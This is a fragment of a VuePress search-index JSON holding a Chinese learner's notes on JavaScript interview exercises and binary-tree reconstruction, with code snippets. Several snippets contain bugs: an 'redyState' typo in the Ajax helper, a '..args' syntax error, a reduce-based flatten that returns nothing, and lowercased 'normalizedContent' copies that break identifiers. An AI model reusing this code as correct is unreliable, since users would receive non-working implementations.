      "normalizedContent": "# 题目\n\n\n# 剑指 offer 07\n\n * leetcode输入某二叉树的前序遍历和中序遍历的结果，请构建该二叉树并返回其根节点。\n\n假设输入的前序遍历和中序遍历的结果中都不含重复的数字。\n\n# 思路\n\n * 1、前序遍历找到根结点root\n * 2、找到root在中序遍历的位置 -> 左子树的长度和右子树的长度\n * 3、截取左子树的中序遍历、右子树的中序遍历\n * 4、截取左子树的前序遍历、右子树的前序遍历\n * 5、递归重建二叉树\n\n# 代码\n\n递归\n\nfunction treenode(val) {\n      this.val = val;\n      this.left = this.right = null;\n  }\n  const preorder = [3,9,20,15,7] //前序 节点是1\n  const inorder = [9,3,15,20,7] //中序\n  var reconstructbinarytree = (preorder, inorder)=> {\n        if(preorder.length === 0){\n            return null;\n        }\n        if(preorder.length === 1){\n            return new treenode(preorder[0]);\n        }\n        // 找到根节点\n        let rootval = preorder[0]\n        //跟节点在中序遍历中的索引\n        let index = inorder.indexof(rootval)\n       //先序左子树\n        let preleft = preorder.slice(1,index+1)\n        //先序右子树\n        let preright = preorder.slice(index+1)\n        //中序左子树\n        let inleft = inorder.slice(0,index)\n        //中序右子树\n        let inright = inorder.slice(index+1)\n        // 构建二叉树\n        const node  = new treenode(rootval)\n        node.left = reconstructbinarytree(preleft,inleft)\n        node.right = reconstructbinarytree(preright,inright)\n        return node\n    }\n    reconstructbinarytree(preorder, inorder)\n\n\n\n# leetcode 889\n\n * leetcode 给定两个整数数组，preorder 和 postorder ，其中 preorder 是一个具有 无重复 值的二叉树的前序遍历，postorder 是同一棵树的后序遍历，重构并返回二叉树。\n\n# 思路\n\n * 1、根据前序遍历找到根结点\n * 2、根据前序根节点后的数值确认左子树根节点\n * 3、通过左子树根节点在后序遍历中的index确认左子树和右子树\n * 4、截取左子树的中序遍历、右子树的中序遍历\n * 5、截取左子树的前序遍历、右子树的前序遍历\n * 6、递归重建二叉树输出中序遍历\n\nfunction treenode(val) {\n    this.val = val;\n    this.left = this.right = null;\n  }\n  var preorder = [1, 2, 4, 5, 3, 6, 7]\n  var  postorder = [4, 5, 2, 6, 7, 3, 1];\n  var constructfromprepost = function (preorder, postorder) {\n    if (preorder.length === 0) {\n      return null;\n    }\n    if (preorder.length === 1) {\n      return new treenode(preorder[0]);\n    }\n    //根节点\n    let head = preorder[0];\n    //左子树根节点\n    let prelefthead = preorder[1];\n    //后序遍历左子树根节点index\n    let index = postorder.indexof(prelefthead);\n    //先序、后序\n    let preleft = preorder.slice(1, index + 2);\n    let preright = preorder.slice(index + 2);\n    let postleft = postorder.slice(0, index+1);\n    let postright = postorder.slice(index+1, postorder.length - 1);\n    // 重建树\n    let root = new treenode(head);\n    root.left = constructfromprepost(preleft,postleft)\n    root.right = constructfromprepost(preright,postright)\n    return root\n  };\n  constructfromprepost(preorder, postorder);\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "frontmatter": {},
      "regularPath": "/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",
      "relativePath": "dataStructure/树简介/深度优先遍历.md",
      "key": "v-fcb756ba",
      "path": "/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",
      "headersStr": null,
      "content": "",
      "normalizedContent": "",
      "charsets": {}
    },
    {
      "title": "数据结构",
      "frontmatter": {
        "title": "数据结构"
      },
      "regularPath": "/dataStructure/",
      "relativePath": "dataStructure/README.md",
      "key": "v-5cf39b7b",
      "path": "/dataStructure/",
      "headers": [
        {
          "level": 2,
          "title": "树简介",
          "slug": "树简介",
          "normalizedTitle": "树简介",
          "charIndex": 2
        },
        {
          "level": 2,
          "title": "二叉树",
          "slug": "二叉树",
          "normalizedTitle": "二叉树",
          "charIndex": 17
        }
      ],
      "headersStr": "树简介 二叉树",
      "content": "# 树简介\n\n * 简介\n\n\n# 二叉树\n\n * 前序遍历⭐⭐\n * 中序遍历⭐⭐\n * 后序遍历⭐⭐\n * 二叉树最大宽度\n * 重建二叉树\n * 最小最大深度\n * 层序遍历",
      "normalizedContent": "# 树简介\n\n * 简介\n\n\n# 二叉树\n\n * 前序遍历⭐⭐\n * 中序遍历⭐⭐\n * 后序遍历⭐⭐\n * 二叉树最大宽度\n * 重建二叉树\n * 最小最大深度\n * 层序遍历",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "广度优先遍历",
      "frontmatter": {
        "title": "广度优先遍历"
      },
      "regularPath": "/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",
      "relativePath": "dataStructure/树简介/广度优先遍历.md",
      "key": "v-654671c3",
      "path": "/dataStructure/%E6%A0%91%E7%AE%80%E4%BB%8B/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86.html",
      "headersStr": null,
      "content": "树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n",
      "normalizedContent": "树是用来模拟具有树状结构性质的数据集合。根据它的特性可以分为非常多的种类，对于我们来讲，掌握二叉树这种结构就足够了，它也是树最简单、应用最广泛的种类。\n\n> 二叉树是一种典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。\n\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Array去重扁平化",
      "frontmatter": {
        "title": "Array去重扁平化"
      },
      "regularPath": "/javascript/Array%E5%8E%BB%E9%87%8D%E6%89%81%E5%B9%B3%E5%8C%96.html",
      "relativePath": "javascript/Array去重扁平化.md",
      "key": "v-71b21db6",
      "path": "/javascript/Array%E5%8E%BB%E9%87%8D%E6%89%81%E5%B9%B3%E5%8C%96.html",
      "headers": [
        {
          "level": 3,
          "title": "数组去重",
          "slug": "数组去重",
          "normalizedTitle": "数组去重",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "数组扁平化(Array flatten)",
          "slug": "数组扁平化-array-flatten",
          "normalizedTitle": "数组扁平化(array flatten)",
          "charIndex": 525
        }
      ],
      "headersStr": "数组去重 数组扁平化(Array flatten)",
      "content": "# 数组去重\n\n# reduce(数组对象去重)\n\nlet array = [\n  { id: 1, name: \"a\" },\n  { id: 2, name: \"b\" },\n  { id: 3, name: \"c\" },\n  { id: 5, name: \"d\" },\n  { id: 1, name: \"e\" },\n];\nfunction unique(arr, key) {\n  let obj = {};\n  return arr.reduce((accumulator, currentValue, currentIndex) => {\n    //当前key键的value值存在于obj函数中时,说明重复\n    if (!obj[currentValue[key]]) {\n      obj[currentValue[key]] = true;\n      accumulator.push(currentValue);\n    }\n    return accumulator;\n  }, []);\n}\nconsole.log(\"unique(array,id) :>> \", unique(array, \"id\"));\n\n\n\n# 数组扁平化(Array flatten)\n\n# 递归+reduce\n\nexport function flattenByReduce(arr:any[]=[]):any[] {\n  let res:any = []\n  arr.reduce((acc,cur,index)=>{\n    res = acc.concat(Array.isArray(cur)?flattenByReduce(cur):cur)\n  },[])\n  return res\n}\nconsole.log('flatten() :>> ', flattenByConcat([1,2,[3],[4,[5,[6]]]]));\n\n\n# 递归 +concat\n\n/**\n * concat\n */\n\nexport function flattenByConcat(arr: any[]): any[] {\n  let res: any = [];\n  arr.forEach((item) => {\n    if (Array.isArray(item)) {\n      res = res.concat(flattenByConcat(item));\n    } else {\n      res = res.concat(item);\n    }\n  });\n  return res;\n}\nconsole.log(\"flatten() :>> \", flattenByConcat([1, 2, [3], [4, [5, [6]]]]));\n",
      "normalizedContent": "# 数组去重\n\n# reduce(数组对象去重)\n\nlet array = [\n  { id: 1, name: \"a\" },\n  { id: 2, name: \"b\" },\n  { id: 3, name: \"c\" },\n  { id: 5, name: \"d\" },\n  { id: 1, name: \"e\" },\n];\nfunction unique(arr, key) {\n  let obj = {};\n  return arr.reduce((accumulator, currentvalue, currentindex) => {\n    //当前key键的value值存在于obj函数中时,说明重复\n    if (!obj[currentvalue[key]]) {\n      obj[currentvalue[key]] = true;\n      accumulator.push(currentvalue);\n    }\n    return accumulator;\n  }, []);\n}\nconsole.log(\"unique(array,id) :>> \", unique(array, \"id\"));\n\n\n\n# 数组扁平化(array flatten)\n\n# 递归+reduce\n\nexport function flattenbyreduce(arr:any[]=[]):any[] {\n  let res:any = []\n  arr.reduce((acc,cur,index)=>{\n    res = acc.concat(array.isarray(cur)?flattenbyreduce(cur):cur)\n  },[])\n  return res\n}\nconsole.log('flatten() :>> ', flattenbyconcat([1,2,[3],[4,[5,[6]]]]));\n\n\n# 递归 +concat\n\n/**\n * concat\n */\n\nexport function flattenbyconcat(arr: any[]): any[] {\n  let res: any = [];\n  arr.foreach((item) => {\n    if (array.isarray(item)) {\n      res = res.concat(flattenbyconcat(item));\n    } else {\n      res = res.concat(item);\n    }\n  });\n  return res;\n}\nconsole.log(\"flatten() :>> \", flattenbyconcat([1, 2, [3], [4, [5, [6]]]]));\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Javascript",
      "frontmatter": {
        "title": "Javascript"
      },
      "regularPath": "/javascript/",
      "relativePath": "javascript/README.md",
      "key": "v-488f3082",
      "path": "/javascript/",
      "headers": [
        {
          "level": 2,
          "title": "Javascript",
          "slug": "javascript",
          "normalizedTitle": "javascript",
          "charIndex": 2
        }
      ],
      "headersStr": "Javascript",
      "content": "# Javascript\n\n * 深拷贝\n * 手写instanceof\n * 手写手写call,bind,apply\n * 手写new操作符\n * 节流和防抖\n * 手写promise\n * 单例模式\n * 柯里化函数\n * Array去重扁平化\n * 手写Ajax,\n * add(1)(2)(3)\n * for in和for of\n * 手写getType",
      "normalizedContent": "# javascript\n\n * 深拷贝\n * 手写instanceof\n * 手写手写call,bind,apply\n * 手写new操作符\n * 节流和防抖\n * 手写promise\n * 单例模式\n * 柯里化函数\n * array去重扁平化\n * 手写ajax,\n * add(1)(2)(3)\n * for in和for of\n * 手写gettype",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "add(1)(2)(3)",
      "frontmatter": {
        "title": "add(1)(2)(3)"
      },
      "regularPath": "/javascript/add(1)(2)(3).html",
      "relativePath": "javascript/add(1)(2)(3).md",
      "key": "v-e8b96868",
      "path": "/javascript/add(1)(2)(3).html",
      "headers": [
        {
          "level": 3,
          "title": "单纯的实现",
          "slug": "单纯的实现",
          "normalizedTitle": "单纯的实现",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "闭包暴力实现",
          "slug": "闭包暴力实现",
          "normalizedTitle": "闭包暴力实现",
          "charIndex": 93
        },
        {
          "level": 3,
          "title": "Currying",
          "slug": "currying",
          "normalizedTitle": "currying",
          "charIndex": 336
        }
      ],
      "headersStr": "单纯的实现 闭包暴力实现 Currying",
      "content": "# 单纯的实现\n\n  const add = x=>y=>z=>x+y+z\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n\n# 闭包暴力实现\n\n  function add(x){\n    return function(y){\n      return function(z){\n        return x+y+z\n      }\n    }\n  }\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n以上只是单纯的实现add(1)(2)(3) 如果一个函数实现add(1, 2, 3);add(1, 2)(3);add(1)(2, 3)呢？\n\n\n# Currying\n\nfunction currying(fn){\n  return function curry(...args){\n    if(fn.length!==args.length){\n      return curry.bind(null,..args)\n    }\n    return fn(...args)\n  }\n}\nconst totalNum = (x,y,z)=>x+y+z\nconst curryTotal = currying(totalNum)\nconsole.log(curryTotal(1)(2)(3))\n\n\nconst curry = (fn, ...args) => \n    // 函数的参数个数可以直接通过函数数的.length属性来访问\n    args.length >= fn.length // 这个判断很关键！！！\n    // 传入的参数大于等于原始函数fn的参数个数，则直接执行该函数\n    ? fn(...args)\n    /**\n     * 传入的参数小于原始函数fn的参数个数时\n     * 则继续对当前函数进行柯里化，返回一个接受所有参数（当前参数和剩余参数） 的函数\n    */\n    : (..._args) => curry(fn, ...args, ..._args);\n\nfunction add1(x, y, z) {\n    return x + y + z;\n}\nconst add = curry(add1);\nconsole.log(add(1, 2, 3));\nconsole.log(add(1)(2)(3));\nconsole.log(add(1, 2)(3));\nconsole.log(add(1)(2, 3));\n",
      "normalizedContent": "# 单纯的实现\n\n  const add = x=>y=>z=>x+y+z\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n\n# 闭包暴力实现\n\n  function add(x){\n    return function(y){\n      return function(z){\n        return x+y+z\n      }\n    }\n  }\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n以上只是单纯的实现add(1)(2)(3) 如果一个函数实现add(1, 2, 3);add(1, 2)(3);add(1)(2, 3)呢？\n\n\n# currying\n\nfunction currying(fn){\n  return function curry(...args){\n    if(fn.length!==args.length){\n      return curry.bind(null,..args)\n    }\n    return fn(...args)\n  }\n}\nconst totalnum = (x,y,z)=>x+y+z\nconst currytotal = currying(totalnum)\nconsole.log(currytotal(1)(2)(3))\n\n\nconst curry = (fn, ...args) => \n    // 函数的参数个数可以直接通过函数数的.length属性来访问\n    args.length >= fn.length // 这个判断很关键！！！\n    // 传入的参数大于等于原始函数fn的参数个数，则直接执行该函数\n    ? fn(...args)\n    /**\n     * 传入的参数小于原始函数fn的参数个数时\n     * 则继续对当前函数进行柯里化，返回一个接受所有参数（当前参数和剩余参数） 的函数\n    */\n    : (..._args) => curry(fn, ...args, ..._args);\n\nfunction add1(x, y, z) {\n    return x + y + z;\n}\nconst add = curry(add1);\nconsole.log(add(1, 2, 3));\nconsole.log(add(1)(2)(3));\nconsole.log(add(1, 2)(3));\nconsole.log(add(1)(2, 3));\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "for in和for of",
      "frontmatter": {
        "title": "for in和for of"
      },
      "regularPath": "/javascript/for%20in%E5%92%8Cfor%20of.html",
      "relativePath": "javascript/for in和for of.md",
      "key": "v-60a40125",
      "path": "/javascript/for%20in%E5%92%8Cfor%20of.html",
      "headers": [
        {
          "level": 2,
          "title": "for in和for of",
          "slug": "for-in和for-of",
          "normalizedTitle": "for in和for of",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "对象根据主键去重",
          "slug": "对象根据主键去重",
          "normalizedTitle": "对象根据主键去重",
          "charIndex": 1121
        }
      ],
      "headersStr": "for in和for of 对象根据主键去重",
      "content": "# for in和for of\n\n * for in可以遍历对象返回key，遍历数组，返回下标index\n * for of可以遍历数组，返回值，不能遍历对象\n\n//遍历对象\n  let obj = {\n    name:'yang',\n    age:18\n  }\n  for(let i in obj){\n    console.log('i :>> ', i); // name  age\n  }\n  for(let i of obj){\n    console.log('i :>> ', i); //obj is not iterable\n  }\n\n  // 遍历数组\n  let arr = [1,2,3,4]\n  for(let item in arr){\n    console.log('item :>> ', item); //0 1 2 3\n  }\n  for(let item of arr){\n    console.log('item :>> ', item); // 1 2 3 4\n  }\n\n\n * for of可以遍历Set,Map\n\n //map\n  let map = new Map([\n    ['name','yang'],\n    ['age',18]\n  ])\n  for(let i of map){\n    console.log('i :>> ', i);\n    //i :>>  ['name', 'yang']\n    //i :>>  ['age', 18]\n  }\n\n  //Set\n  let set = new Set([1,2,3,3,4,4,5])\n  for(let i of set) {\n    console.log('i :>> ', i);\n  }\n\n\n> for in用于可枚举数据，如数组，对象，字符串\n\nlet obj = {'name':'yang'}\nObject.getOwnPropertyDescriptors(obj)\n// {\n//     \"name\": {\n//         \"value\": \"yang\",\n//         \"writable\": true,\n//         \"enumerable\": true, //可枚举属性为true\n//         \"configurable\": true\n//     }\n// }\n\n\n * Object.getOwnPropertyDescriptor()——获取所有属性里面的数据描述符\n\n> for of用于可迭代数据，数组、字符串、Map、Set\n\n\n# 对象根据主键去重\n\n根据对象的主键去重，如果对象a中存在与b对象主键相同的元素，则删除掉，最后输出a\n\nlet obj1 = {\n    '0x123456':'a',\n    '0x123455':'b',\n    '0x195237':'c',\n    '0x145839':'d'\n  }\n  let obj2 = {\n    '0x123456':'adede',\n    '0x123465':'brrg',\n    '0x195247':'cvvfv',\n    '0x123455':'dcsq'\n  }\n \n  function getUniqueObj(a,b){\n    for(let i in a) {\n    for(let e in b){\n      if(i===e){\n        delete a[i]\n      }\n    }\n  }\n  return a\n  }\n  console.log(getUniqueObj(obj1,obj2))\n",
      "normalizedContent": "# for in和for of\n\n * for in可以遍历对象返回key，遍历数组，返回下标index\n * for of可以遍历数组，返回值，不能遍历对象\n\n//遍历对象\n  let obj = {\n    name:'yang',\n    age:18\n  }\n  for(let i in obj){\n    console.log('i :>> ', i); // name  age\n  }\n  for(let i of obj){\n    console.log('i :>> ', i); //obj is not iterable\n  }\n\n  // 遍历数组\n  let arr = [1,2,3,4]\n  for(let item in arr){\n    console.log('item :>> ', item); //0 1 2 3\n  }\n  for(let item of arr){\n    console.log('item :>> ', item); // 1 2 3 4\n  }\n\n\n * for of可以遍历set,map\n\n //map\n  let map = new map([\n    ['name','yang'],\n    ['age',18]\n  ])\n  for(let i of map){\n    console.log('i :>> ', i);\n    //i :>>  ['name', 'yang']\n    //i :>>  ['age', 18]\n  }\n\n  //set\n  let set = new set([1,2,3,3,4,4,5])\n  for(let i of set) {\n    console.log('i :>> ', i);\n  }\n\n\n> for in用于可枚举数据，如数组，对象，字符串\n\nlet obj = {'name':'yang'}\nobject.getownpropertydescriptors(obj)\n// {\n//     \"name\": {\n//         \"value\": \"yang\",\n//         \"writable\": true,\n//         \"enumerable\": true, //可枚举属性为true\n//         \"configurable\": true\n//     }\n// }\n\n\n * object.getownpropertydescriptor()——获取所有属性里面的数据描述符\n\n> for of用于可迭代数据，数组、字符串、map、set\n\n\n# 对象根据主键去重\n\n根据对象的主键去重，如果对象a中存在与b对象主键相同的元素，则删除掉，最后输出a\n\nlet obj1 = {\n    '0x123456':'a',\n    '0x123455':'b',\n    '0x195237':'c',\n    '0x145839':'d'\n  }\n  let obj2 = {\n    '0x123456':'adede',\n    '0x123465':'brrg',\n    '0x195247':'cvvfv',\n    '0x123455':'dcsq'\n  }\n \n  function getuniqueobj(a,b){\n    for(let i in a) {\n    for(let e in b){\n      if(i===e){\n        delete a[i]\n      }\n    }\n  }\n  return a\n  }\n  console.log(getuniqueobj(obj1,obj2))\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "单例模式",
      "frontmatter": {
        "title": "单例模式"
      },
      "regularPath": "/javascript/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.html",
      "relativePath": "javascript/单例模式.md",
      "key": "v-5ea312a7",
      "path": "/javascript/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.html",
      "headers": [
        {
          "level": 3,
          "title": "单例模式",
          "slug": "单例模式",
          "normalizedTitle": "单例模式",
          "charIndex": 2
        }
      ],
      "headersStr": "单例模式",
      "content": "# 单例模式\n\nvar Head = (function () {\n    var HeadClass = function () { }; // 声明HeadClass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new HeadClass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = Head();\nvar b = new Head();\nconsole.log(a===b) // true\nvar a = HeadClass(); // 报错,HeadClass is not defined\n\n",
      "normalizedContent": "# 单例模式\n\nvar head = (function () {\n    var headclass = function () { }; // 声明headclass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new headclass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = head();\nvar b = new head();\nconsole.log(a===b) // true\nvar a = headclass(); // 报错,headclass is not defined\n\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "for和forEach谁更快",
      "frontmatter": {
        "title": "for和forEach谁更快"
      },
      "regularPath": "/javascript/for%E5%92%8CforEach%E8%B0%81%E6%9B%B4%E5%BF%AB.html",
      "relativePath": "javascript/for和forEach谁更快.md",
      "key": "v-1834bbf3",
      "path": "/javascript/for%E5%92%8CforEach%E8%B0%81%E6%9B%B4%E5%BF%AB.html",
      "headers": [
        {
          "level": 2,
          "title": "为什么？",
          "slug": "为什么",
          "normalizedTitle": "为什么？",
          "charIndex": 49
        },
        {
          "level": 2,
          "title": "如何验证？",
          "slug": "如何验证",
          "normalizedTitle": "如何验证？",
          "charIndex": 128
        }
      ],
      "headersStr": "为什么？ 如何验证？",
      "content": "# for 和 forEach 谁更快\n\n * for 更快，forEach 可读性更好\n\n\n# 为什么？\n\nfor 直接在当前函数中执行，forEach 每次都要新创建一个函数。 函数有单独的作用域和上下文（可回顾“堆栈模型”），所以耗时更久。\n\n\n# 如何验证？\n\nconst arr = [];\nfor (let i = 0; i < 1000 * 10000; i++) {\n  arr.push(i);\n}\nconst length = arr.length;\n\nconsole.time(\"for\");\nlet n1 = 0;\nfor (let i = 0; i < length; i++) {\n  n1++;\n}\nconsole.timeEnd(\"for\"); // for: 11.7373046875 ms\n\nconsole.time(\"forEach\");\nlet n2 = 0;\narr.forEach(() => n2++);\nconsole.timeEnd(\"forEach\"); // forEach: 67.514892578125 ms\n",
      "normalizedContent": "# for 和 foreach 谁更快\n\n * for 更快，foreach 可读性更好\n\n\n# 为什么？\n\nfor 直接在当前函数中执行，foreach 每次都要新创建一个函数。 函数有单独的作用域和上下文（可回顾“堆栈模型”），所以耗时更久。\n\n\n# 如何验证？\n\nconst arr = [];\nfor (let i = 0; i < 1000 * 10000; i++) {\n  arr.push(i);\n}\nconst length = arr.length;\n\nconsole.time(\"for\");\nlet n1 = 0;\nfor (let i = 0; i < length; i++) {\n  n1++;\n}\nconsole.timeend(\"for\"); // for: 11.7373046875 ms\n\nconsole.time(\"foreach\");\nlet n2 = 0;\narr.foreach(() => n2++);\nconsole.timeend(\"foreach\"); // foreach: 67.514892578125 ms\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "手写call,bind,apply",
      "frontmatter": {
        "title": "手写call,bind,apply"
      },
      "regularPath": "/javascript/%E6%89%8B%E5%86%99call,bind,apply.html",
      "relativePath": "javascript/手写call,bind,apply.md",
      "key": "v-3636c130",
      "path": "/javascript/%E6%89%8B%E5%86%99call,bind,apply.html",
      "headers": [
        {
          "level": 2,
          "title": "手写bind",
          "slug": "手写bind",
          "normalizedTitle": "手写bind",
          "charIndex": 2
        },
        {
          "level": 2,
          "title": "手写call",
          "slug": "手写call",
          "normalizedTitle": "手写call",
          "charIndex": 420
        },
        {
          "level": 2,
          "title": "手写apply",
          "slug": "手写apply",
          "normalizedTitle": "手写apply",
          "charIndex": 610
        }
      ],
      "headersStr": "手写bind 手写call 手写apply",
      "content": "# 手写bind\n\n * 调用bind过程中不会执行方法,只会返回一个方法\n\nFunction.prototype.newbind = function(){\n  const args = Array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\n\n\n\n# 手写call\n\nFunction.prototype.myCall= function (context,...args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n\n\n\n# 手写apply\n\nFunction.prototype.myApply = function (context,args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n",
      "normalizedContent": "# 手写bind\n\n * 调用bind过程中不会执行方法,只会返回一个方法\n\nfunction.prototype.newbind = function(){\n  const args = array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\n\n\n\n# 手写call\n\nfunction.prototype.mycall= function (context,...args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n\n\n\n# 手写apply\n\nfunction.prototype.myapply = function (context,args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "frontmatter": {},
      "regularPath": "/guide/",
      "relativePath": "guide/README.md",
      "key": "v-67b513d6",
      "path": "/guide/",
      "headersStr": null,
      "content": "前端\n\n> js,http,vue,css......学废or学废....\n\n----------------------------------------\n\nJavascript\n\n> coding...coding...coding...\n\n----------------------------------------\n\n数据结构\n\n> 暂时只有tree的原因，也是因为自己也才学习了tree，正处在数据结构起步阶段，痛苦中",
      "normalizedContent": "前端\n\n> js,http,vue,css......学废or学废....\n\n----------------------------------------\n\njavascript\n\n> coding...coding...coding...\n\n----------------------------------------\n\n数据结构\n\n> 暂时只有tree的原因，也是因为自己也才学习了tree，正处在数据结构起步阶段，痛苦中",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "手写getType",
      "frontmatter": {
        "title:'手写getType'": null
      },
      "regularPath": "/javascript/%E6%89%8B%E5%86%99getType.html",
      "relativePath": "javascript/手写getType.md",
      "key": "v-792a7262",
      "path": "/javascript/%E6%89%8B%E5%86%99getType.html",
      "headersStr": null,
      "content": "# 手写getType\n\n重点是使用Object.prototype.toString.call()\n\n * 获取详细的数据类型\n\n/**\n * 获取详细的数据类型\n * @param val\n */\nfunction getType(val: any): string {\n  //调用原型中的方法\n  const typeProto = Object.prototype.toString.call(val) //[object String]\n  const spaceIndex = typeProto.indexOf(' ')\n  const type = typeProto.slice(spaceIndex + 1, -1)\n  return type.toLowerCase()\n}\nconsole.info(getType(() => { }))\nconsole.log(getType(100))\nconsole.log(getType({}))\n",
      "normalizedContent": "# 手写gettype\n\n重点是使用object.prototype.tostring.call()\n\n * 获取详细的数据类型\n\n/**\n * 获取详细的数据类型\n * @param val\n */\nfunction gettype(val: any): string {\n  //调用原型中的方法\n  const typeproto = object.prototype.tostring.call(val) //[object string]\n  const spaceindex = typeproto.indexof(' ')\n  const type = typeproto.slice(spaceindex + 1, -1)\n  return type.tolowercase()\n}\nconsole.info(gettype(() => { }))\nconsole.log(gettype(100))\nconsole.log(gettype({}))\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "手写Ajax",
      "frontmatter": {
        "title": "手写Ajax"
      },
      "regularPath": "/javascript/%E6%89%8B%E5%86%99Ajax.html",
      "relativePath": "javascript/手写Ajax.md",
      "key": "v-37a6fbbc",
      "path": "/javascript/%E6%89%8B%E5%86%99Ajax.html",
      "headers": [
        {
          "level": 3,
          "title": "手写Ajax",
          "slug": "手写ajax",
          "normalizedTitle": "手写ajax",
          "charIndex": 2
        }
      ],
      "headersStr": "手写Ajax",
      "content": "# 手写Ajax\n\nconst ajax = (method, url, data, success, fail) => {\n  var request = new XMLHttpRequest()\n  request.open(method, url)\n  request.onreadystatechange = function () {\n    if(request.redyState === 4) {\n      if(request.status >= 200 && request.status < 300 || request.status === 304) {\n        success(request)\n      }else {\n          fail(request)\n        }\n    }\n  }\n  request.send()\n}\n",
      "normalizedContent": "# 手写ajax\n\nconst ajax = (method, url, data, success, fail) => {\n  var request = new xmlhttprequest()\n  request.open(method, url)\n  request.onreadystatechange = function () {\n    if(request.redystate === 4) {\n      if(request.status >= 200 && request.status < 300 || request.status === 304) {\n        success(request)\n      }else {\n          fail(request)\n        }\n    }\n  }\n  request.send()\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "手写instanceof",
      "frontmatter": {
        "title": "手写instanceof"
      },
      "regularPath": "/javascript/%E6%89%8B%E5%86%99instanceof.html",
      "relativePath": "javascript/手写instanceof.md",
      "key": "v-dd1c97bc",
      "path": "/javascript/%E6%89%8B%E5%86%99instanceof.html",
      "headers": [
        {
          "level": 2,
          "title": "手写instanceof",
          "slug": "手写instanceof",
          "normalizedTitle": "手写instanceof",
          "charIndex": 2
        }
      ],
      "headersStr": "手写instanceof",
      "content": "# 手写instanceof\n\n/**\n * @param source\n * @param target class or function\n */\nfunction newInstanceof(source:any,target:any):boolean {\n  //判空和所有的值类型\n  if(!['function','object'].includes(typeof source)|| typeof source ==null) return false\n  let tempSource = source\n  while(tempSource){\n    if(tempSource.__proto__ === target.prototype){\n      return true\n    }\n    //如果找不到\n    //那就继续顺着原型链，往上找\n    tempSource = tempSource.__proto__\n  }\n  return false\n}\nconsole.info( newInstanceof({}, Object) )\nconsole.info( newInstanceof([], Object) )\nconsole.info( newInstanceof([], Array) )\nconsole.info( newInstanceof({}, Array) )\n",
      "normalizedContent": "# 手写instanceof\n\n/**\n * @param source\n * @param target class or function\n */\nfunction newinstanceof(source:any,target:any):boolean {\n  //判空和所有的值类型\n  if(!['function','object'].includes(typeof source)|| typeof source ==null) return false\n  let tempsource = source\n  while(tempsource){\n    if(tempsource.__proto__ === target.prototype){\n      return true\n    }\n    //如果找不到\n    //那就继续顺着原型链，往上找\n    tempsource = tempsource.__proto__\n  }\n  return false\n}\nconsole.info( newinstanceof({}, object) )\nconsole.info( newinstanceof([], object) )\nconsole.info( newinstanceof([], array) )\nconsole.info( newinstanceof({}, array) )\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "手写new",
      "frontmatter": {
        "title": "手写new"
      },
